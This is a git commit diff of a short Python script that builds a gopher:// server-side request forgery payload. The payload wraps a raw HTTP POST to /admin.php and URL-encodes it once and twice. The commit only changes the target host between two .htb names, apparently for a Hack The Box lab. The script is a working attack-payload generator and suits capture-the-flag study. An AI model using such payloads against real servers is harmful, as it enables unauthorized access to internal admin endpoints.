fa5715b52e92c76efac884095f65e3c2204b342b
Nguyen Hung (Mitchell) <101271637+0xGunrunner@users.noreply.github.com>
2025-08-25 00:27:15 +0700

    Update gopher-manual.py

--- gopher-manual.py
+++ gopher-manual.py
@@ -1,7 +1,7 @@
 from urllib.parse import quote
 
 payload = ("POST /admin.php HTTP/1.1\r\n"
-           "Host: dataserver.htb\r\n"
+           "Host: thatserver.htb\r\n"
            "Content-Length: 17\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "\r\n"
@@ -12,7 +12,7 @@ enc1 = quote(payload, safe="/-._:")
 # 2) But force ONLY the HTTP version slash to be encoded
 enc1 = enc1.replace("HTTP/1.1", "HTTP%2F1.1", 1)
 
-u1 = f"gopher://dataserver.htb:80/_{enc1}"     # single-encoded - YOU NEED TO CHANGE THE HOST HERE EXAMPLE dataserver.htb -> someserver.htb accordingly.
+u1 = f"gopher://thatserver.htb:80/_{enc1}"     # single-encoded - YOU NEED TO CHANGE THE HOST HERE EXAMPLE dataserver.htb -> someserver.htb accordingly.
 u2 = quote(u1, safe="/")                        # double-encoded (slashes preserved)
 
 print(u1)
